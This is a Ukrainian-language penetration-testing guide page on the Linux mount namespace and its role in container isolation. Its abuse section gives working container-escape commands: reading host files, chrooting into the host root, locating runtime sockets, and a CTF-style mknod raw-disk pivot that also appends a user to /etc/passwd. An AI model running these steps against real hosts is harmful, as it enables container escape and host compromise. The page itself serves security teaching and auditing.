# Простір імен mount

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

Простір імен mount контролює **mount table**, яку бачить процес. Це одна з найважливіших функцій ізоляції контейнерів, оскільки root filesystem, bind mounts, tmpfs mounts, перегляд procfs, експозиція sysfs та багато runtime-специфічних допоміжних маунтів представлені через цю mount table. Два процеси можуть одночасно отримувати доступ до `/`, `/proc`, `/sys` або `/tmp`, але те, до чого ці шляхи врешті резольвляться, залежить від простору імен mount, в якому вони перебувають.

З точки зору безпеки контейнерів, простір імен mount часто відрізняє ситуацію «це акуратно підготовлена файловa система застосунку» від «цей процес може безпосередньо бачити або впливати на файлову систему хоста». Саме тому bind mounts, `hostPath` volumes, привілейовані операції маунтування та записувані експозиції `/proc` або `/sys` пов'язані з цим простором імен.

## Принцип роботи

Коли runtime запускає контейнер, зазвичай створюється новий простір імен mount, готується root filesystem для контейнера, за потреби монтуються procfs та інші допоміжні файлові системи, а потім опціонально додаються bind mounts, tmpfs mounts, secrets, config maps або host paths. Коли процес працює всередині цього простору імен, набір маунтів, які він бачить, у значній мірі відокремлений від стандартного виду хоста. Хост усе ще може бачити реальну підлеглу файлову систему, але контейнер бачить версію, зібрану для нього runtime-ом.

Це потужно, бо дозволяє контейнеру вважати, що в нього є власна root filesystem, хоча хост і надалі керує всім. Це також небезпечно: якщо runtime експонує невірний маунт, процес раптово отримує видимість ресурсів хоста, які решта моделі безпеки могла не передбачати захищеними.

## Лаб

Ви можете створити приватний простір імен mount за допомогою:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Якщо відкрити іншу shell поза цією namespace і переглянути mount table, ви побачите, що tmpfs mount існує лише всередині ізольованого mount namespace. Це корисна вправа, оскільки показує, що mount isolation не є абстрактною теорією; kernel буквально надає процесу інший mount table.
Якщо відкрити іншу shell поза цією namespace і переглянути mount table, tmpfs mount буде існувати лише всередині ізольованого mount namespace.

Всередині containers, коротке порівняння:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Другий приклад показує, наскільки легко конфігурація runtime може створити величезну діру в межах файлової системи.

## Використання Runtime

Docker, Podman, containerd-based stacks, and CRI-O покладаються на приватний mount namespace для звичайних контейнерів. Kubernetes будується на тій самій механіці для volume-ів, projected secrets, config maps та `hostPath` mounts. Incus/LXC середовища також сильно залежать від mount namespaces, особливо тому, що system containers часто відкривають більш розширені й машиноподібні файлові системи, ніж application containers.

Це означає, що коли ви переглядаєте проблему з файловою системою контейнера, ви зазвичай не маєте справи з ізольованою особливістю Docker. Ви маєте справу з проблемою mount-namespace і runtime-configuration, що виражається через ту платформу, яка запустила workload.

## Помилки конфігурації

Найочевидніша й найнебезпечніша помилка — це експонування host root filesystem або іншого чутливого шляху хоста через bind mount, наприклад `-v /:/host` або записуваний `hostPath` у Kubernetes. У такому випадку питання вже не «чи може container якимось чином втекти?», а скоріше «який обсяг корисного вмісту хоста вже безпосередньо видно і доступний для запису?» Записуваний host bind mount часто перетворює решту експлойту на просте питання розміщення файлів, chrooting, модифікації конфігурації або runtime socket discovery.

Інша поширена проблема — експонування host `/proc` або `/sys` таким чином, що обходиться безпечнішим поданням для контейнера. Ці файлові системи не є звичайними даними; вони є інтерфейсами до стану kernel та процесів. Якщо workload отримує доступ до host-версій безпосередньо, багато припущень, що лежать в основі посилення безпеки контейнера, перестають коректно застосовуватися.

Захист від запису теж має значення. Read-only root filesystem не магічно робить контейнер безпечним, але він усуває велику частину простору для підготовки атаки і ускладнює persistence, helper-binary placement та config tampering. Навпаки, writable root або writable host bind mount дає attacker'у простір для підготовки наступного кроку.

## Зловживання

Коли mount namespace використовується неправильно, атакувальники зазвичай роблять одне з чотирьох: Вони **читають дані хоста**, які мали б залишатися поза контейнером. Вони **змінюють конфігурацію хоста** через записувані bind mounts. Вони **монтують або перемонтовують додаткові ресурси**, якщо capabilities та seccomp це дозволяють. Або вони **отримують доступ до потужних сокетів та runtime state директорій**, які дозволяють запитувати саму container платформу про додаткові привілеї.

Якщо container вже бачить host filesystem, решта моделі безпеки миттєво змінюється.

Коли ви підозрюєте host bind mount, спочатку підтвердьте, що доступно і чи це записувано:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Якщо коренева файлова система хоста змонтована read-write, прямий доступ до хоста часто є таким простим:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Якщо мета — привілейований runtime доступ, а не пряме chroot, перелічіть sockets і runtime state:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Якщо `CAP_SYS_ADMIN` присутній, також перевірте, чи можна створювати нові mounts зсередини контейнера:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Повний приклад: Two-Shell `mknod` Pivot

Більш спеціалізований шлях зловживання виникає, коли container root user може створювати block devices, host і container ділять користувацьку ідентичність у вигідний спосіб, і attacker вже має low-privilege foothold на host. У такому випадку container може створити device node, наприклад `/dev/sda`, а low-privilege host user пізніше може прочитати його через `/proc/<pid>/root/` для відповідного container process.

Всередині container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
З host, від імені відповідного low-privilege user після знаходження container shell PID:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
The important lesson is not the exact CTF string search. It is that mount-namespace exposure through `/proc/<pid>/root/` can let a host user reuse container-created device nodes even when cgroup device policy prevented direct use inside the container itself.

## Перевірки

Ці команди показують, як виглядає файлова система, в якій фактично працює поточний процес. Мета — виявити маунти з хоста, чутливі шляхи, доступні для запису, та будь-що, що виглядає ширшим за типовий root filesystem контейнера.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
- Bind-монти з хоста, особливо `/`, `/proc`, `/sys`, директорії стану виконання або місця розташування сокетів, повинні відразу кидатися в очі.
- Неочікувані read-write монти зазвичай важливіші, ніж велика кількість read-only допоміжних монтувань.
- `mountinfo` часто є найкращим місцем, щоб побачити, чи шлях дійсно походить від хоста або є overlay-backed.

Ці перевірки встановлюють **які ресурси видимі в цьому namespace**, **які з них походять від хоста**, та **які з них доступні для запису або є чутливими з погляду безпеки**.
